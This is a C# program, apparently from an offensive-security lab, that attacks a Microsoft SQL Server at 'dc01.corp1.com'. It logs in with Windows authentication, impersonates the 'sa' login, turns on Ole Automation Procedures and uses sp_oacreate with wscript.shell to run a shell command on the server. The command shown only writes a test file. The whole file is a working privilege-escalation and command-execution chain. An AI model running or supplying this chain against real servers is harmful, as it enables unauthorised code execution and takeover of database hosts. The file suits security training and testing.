using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
       
        static void Main(string[] args)
        {
          String sqlServer = "dc01.corp1.com";
          
          //The default database in MS SQL is called “master”
          String database = "master";
          String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
          SqlConnection con = new SqlConnection(conString);
          
          try
          {
            con.Open();
            Console.WriteLine("Auth success!");
          }
          catch
          {
            Console.WriteLine("Auth failed");
            Environment.Exit(0);
          }
          String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
          String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
          String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
          //impersonate user
          SqlCommand command = new SqlCommand(impersonateUser, con);
          SqlDataReader reader = command.ExecuteReader();
          reader.Close();
          
          //enable ole
          command = new SqlCommand(enable_ole, con);
          reader = command.ExecuteReader();
          reader.Close();
          
          //run query, write output to file
          command = new SqlCommand(execCmd, con);
          reader = command.ExecuteReader();
          reader.Close();        
          con.Close();         
          
        }
    }
}
